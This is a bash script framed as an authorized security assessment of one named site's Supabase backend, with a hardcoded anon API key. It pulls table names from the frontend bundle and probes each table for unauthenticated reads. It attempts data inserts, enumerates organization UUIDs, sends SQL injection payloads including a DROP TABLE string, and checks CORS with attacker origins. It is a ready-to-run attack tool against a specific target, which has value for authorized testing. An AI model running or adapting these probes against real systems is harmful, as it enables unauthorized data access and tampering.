#!/bin/bash
# Supabase Security Assessment Script
# Run ONLY with proper authorization

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}╔══════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║   Supabase Security Assessment - Ornn.com          ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════╝${NC}"

# Configuration
ANON_KEY='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1rYWZ3cXloc2NkemNpeXdvYXR1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjUyOTE5MDgsImV4cCI6MjA4MDg2NzkwOH0.pLdo0r6WEUkJ36o-nlFMVbLGhxuHAAtnfIZvXMGSVZQ'
SUPABASE_URL="https://id.ornn.com/rest/v1"
FRONTEND_BUNDLE="https://data.ornn.com/_next/static/chunks/2_up8gos6ch0a.js?dpl=dpl_GbP9rLgcR4R3rfLak7gkPeFostke"

# Create temp directory
WORK_DIR=$(mktemp -d)
cd "$WORK_DIR"
echo -e "${YELLOW}[*] Working directory: $WORK_DIR${NC}"

# Download frontend bundle
echo -e "${YELLOW}[*] Downloading frontend bundle...${NC}"
curl -s -m 20 "$FRONTEND_BUNDLE" -o bundle.js -w "HTTP %{http_code} | Size: %{size_download} bytes\n"

# Extract table names
echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}[+] Extracting table names from frontend bundle${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

TABLES=$(grep -oE '\.from\("[a-zA-Z_.]+"\)' bundle.js | sed 's/\.from("\(.*\)")/\1/' | sort -u)
echo "$TABLES" | while read -r table; do
    echo "  📊 $table"
done

# Extract API endpoints
echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}[+] Extracting API endpoints${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

ENDPOINTS=$(grep -oE '(rest/v1/[a-zA-Z_]+|rpc/[a-zA-Z_]+)' bundle.js | sort -u)
echo "$ENDPOINTS" | while read -r endpoint; do
    echo "  🔗 $endpoint"
done

# Check for sensitive table names
echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}[!] Checking for sensitive table names${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

SENSITIVE=$(echo "$TABLES" | grep -E "(key|secret|token|auth|admin|password|credential|private)")
if [ -n "$SENSITIVE" ]; then
    echo -e "${RED}⚠️  SENSITIVE TABLES FOUND:${NC}"
    echo "$SENSITIVE" | while read -r table; do
        echo -e "  ${RED}🔴 $table${NC}"
    done
else
    echo -e "${GREEN}✅ No obviously sensitive table names found${NC}"
fi

# Test RLS for each table
echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}[+] Testing RLS permissions for each table${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

VULNERABLE=()
declare -A TABLE_STATUS

echo "$TABLES" | while read -r table; do
    # Skip empty lines
    [ -z "$table" ] && continue
    
    # Test SELECT permissions
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "apikey: $ANON_KEY" \
        -H "Authorization: Bearer $ANON_KEY" \
        -H "Content-Type: application/json" \
        "$SUPABASE_URL/$table?limit=1")
    
    # Test COUNT (often overlooked in RLS)
    COUNT_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "apikey: $ANON_KEY" \
        -H "Authorization: Bearer $ANON_KEY" \
        "$SUPABASE_URL/$table?select=count&limit=1")
    
    # Store results
    TABLE_STATUS["$table"]="$STATUS|$COUNT_STATUS"
    
    if [ "$STATUS" = "200" ] || [ "$COUNT_STATUS" = "200" ]; then
        echo -e "${RED}  ⚠️  $table - SELECT: $STATUS, COUNT: $COUNT_STATUS - VULNERABLE!${NC}"
        VULNERABLE+=("$table")
    elif [ "$STATUS" = "401" ] || [ "$STATUS" = "403" ]; then
        echo -e "${GREEN}  ✅ $table - SELECT: $STATUS - Protected${NC}"
    else
        echo -e "${YELLOW}  ?  $table - SELECT: $STATUS (may not exist or error)${NC}"
    fi
    
    sleep 0.5  # Rate limiting
done

# Attempt to create/update (if SELECT works)
echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}[!] Testing write permissions on vulnerable tables${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

for table in "${VULNERABLE[@]}"; do
    # Test INSERT
    INSERT_RESULT=$(curl -s -X POST \
        -H "apikey: $ANON_KEY" \
        -H "Authorization: Bearer $ANON_KEY" \
        -H "Content-Type: application/json" \
        -d '{"test": "security_check"}' \
        -w "\n%{http_code}" \
        "$SUPABASE_URL/$table" 2>/dev/null)
    
    INSERT_CODE=$(echo "$INSERT_RESULT" | tail -n1)
    
    if [ "$INSERT_CODE" = "201" ] || [ "$INSERT_CODE" = "200" ]; then
        echo -e "${RED}  🔴 $table - INSERT: $INSERT_CODE - CAN CREATE DATA!${NC}"
    else
        echo -e "${GREEN}  ✅ $table - INSERT: $INSERT_CODE - Protected${NC}"
    fi
    
    sleep 0.5
done

# Test UUID enumeration
echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}[!] Testing UUID enumeration on organizations${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

# From your findings document
KNOWN_UUID="37cc227b-d813-4954-94c2-0fbf32ecefd6"
TEST_UUIDS=(
    "00000000-0000-0000-0000-000000000000"
    "11111111-1111-1111-1111-111111111111"
    "ffffffff-ffff-ffff-ffff-ffffffffffff"
    "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"
)

# Test known UUID
RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ANON_KEY" \
    "$SUPABASE_URL/organizations?id=eq.$KNOWN_UUID")

if [ "$RESULT" = "200" ]; then
    echo -e "${RED}  ⚠️  Organization UUID is accessible! IDOR risk confirmed${NC}"
else
    echo -e "${GREEN}  ✅ Organization UUID properly protected${NC}"
fi

# Test random UUIDs
for uuid in "${TEST_UUIDS[@]}"; do
    RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "apikey: $ANON_KEY" \
        -H "Authorization: Bearer $ANON_KEY" \
        "$SUPABASE_URL/organizations?id=eq.$uuid")
    
    if [ "$RESULT" = "200" ]; then
        echo -e "${RED}  ⚠️  UUID enumeration possible: $uuid returned 200${NC}"
    fi
    sleep 0.3
done

# Test for SQL injection
echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}[!] Testing for SQL injection vectors${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

SQL_PAYLOADS=(
    "?select=id,'1'='1"
    "?select=*&id=eq.1' OR '1'='1"
    "?select=*&id=eq.1%3B%20DROP%20TABLE"
    "?select=*&order=created_at.desc;--"
)

for payload in "${SQL_PAYLOADS[@]}"; do
    RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "apikey: $ANON_KEY" \
        -H "Authorization: Bearer $ANON_KEY" \
        "$SUPABASE_URL/profiles$payload")
    
    if [ "$RESULT" = "200" ]; then
        echo -e "${RED}  ⚠️  Possible injection in: $payload${NC}"
    elif [ "$RESULT" = "400" ]; then
        echo -e "${GREEN}  ✅ Query properly rejected: $payload${NC}"
    fi
    sleep 0.3
done

# Check CORS configuration
echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}[!] Testing CORS configuration${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

# Test with different origins
ORIGINS=(
    "https://evil.com"
    "https://attacker.org"
    "https://compute.ornn.com"
    "https://data.ornn.com"
)

for origin in "${ORIGINS[@]}"; do
    RESULT=$(curl -s -I \
        -H "Origin: $origin" \
        -H "apikey: $ANON_KEY" \
        -H "Authorization: Bearer $ANON_KEY" \
        "$SUPABASE_URL/profiles?limit=1" 2>/dev/null | grep -i "access-control-allow-origin")
    
    if [ -n "$RESULT" ]; then
        echo -e "${YELLOW}  🔗 $origin -> $RESULT${NC}"
    fi
done

# Security headers check
echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}[!] Checking security headers${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

HEADERS=$(curl -s -I \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ANON_KEY" \
    "$SUPABASE_URL/profiles?limit=1" 2>/dev/null)

echo "$HEADERS" | grep -E "(Strict-Transport-Security|X-Frame-Options|X-Content-Type-Options|Content-Security-Policy|Access-Control-Allow-Credentials)" || \
    echo -e "${RED}  ⚠️  Missing security headers${NC}"

# Summary
echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}[+] Security Assessment Summary${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

if [ ${#VULNERABLE[@]} -eq 0 ]; then
    echo -e "${GREEN}✅ No obvious RLS vulnerabilities found${NC}"
else
    echo -e "${RED}⚠️  RLS VULNERABILITIES FOUND:${NC}"
    for table in "${VULNERABLE[@]}"; do
        echo -e "  ${RED}🔴 $table${NC}"
    done
fi

# Save results
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
RESULT_FILE="ornn_security_scan_$TIMESTAMP.txt"

{
    echo "Ornn.com Security Assessment"
    echo "============================"
    echo "Date: $(date)"
    echo ""
    echo "Discovered Tables:"
    echo "$TABLES"
    echo ""
    echo "API Endpoints:"
    echo "$ENDPOINTS"
    echo ""
    echo "Vulnerable Tables:"
    for table in "${VULNERABLE[@]}"; do
        echo "$table"
    done
    echo ""
    echo "Security Headers:"
    echo "$HEADERS" | grep -E "(Strict-Transport-Security|X-Frame-Options|X-Content-Type-Options|Content-Security-Policy)"
} > "$RESULT_FILE"

echo -e "\n${GREEN}📝 Results saved to: $RESULT_FILE${NC}"

# Cleanup
echo -e "${YELLOW}[*] Cleaning up...${NC}"
cd /
rm -rf "$WORK_DIR"

echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}✅ Assessment complete${NC}"
echo -e "${YELLOW}⚠️  Report all findings responsibly${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"